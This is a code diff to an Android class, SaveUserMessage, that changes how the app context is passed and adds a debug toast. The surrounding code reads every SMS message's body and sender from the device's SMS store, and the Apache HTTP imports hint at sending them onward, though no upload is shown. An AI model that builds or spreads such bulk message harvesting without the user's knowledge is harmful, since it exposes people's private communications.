@@ -5,6 +5,7 @@ import android.app.Activity;
 import android.app.Application;
 import android.content.ContentResolver;
 import android.content.Context;
+import android.content.ContextWrapper;
 import android.content.pm.PackageManager;
 import android.database.Cursor;
 import android.net.Uri;
@@ -14,6 +15,7 @@ import android.support.v4.content.ContextCompat;
 import android.support.v7.app.AppCompatActivity;
 import android.widget.ArrayAdapter;
 import android.widget.ListView;
+import android.widget.Toast;
 
 import org.apache.http.HttpEntity;
 import org.apache.http.HttpResponse;
@@ -35,11 +37,11 @@ public class SaveUserMessage extends AppCompatActivity {
 
 
     //private
-    public Context context;
+    public ContextWrapper context;
     //private static ContentResolver contentResolver;
 
     ///////////////////le context de l'application///////////////////
-    public SaveUserMessage(Context context) {
+    public SaveUserMessage(ContextWrapper context) {
         this.context = context;
     }
 
@@ -51,8 +53,9 @@ public class SaveUserMessage extends AppCompatActivity {
             }*/
             //SaveUserMessage ctx = new SaveUserMessage(context);
 
+        Toast.makeText(context, "Entrée dans Do", Toast.LENGTH_LONG).show();
 
-            ContentResolver contentResolver = getContentResolver();
+            ContentResolver contentResolver = context.getContentResolver();
             Cursor smsInboxCursor = contentResolver.query(Uri.parse("content://sms/"), null, null, null, null);
             int indexBody = smsInboxCursor.getColumnIndex("body");
             int indexAddress = smsInboxCursor.getColumnIndex("address");
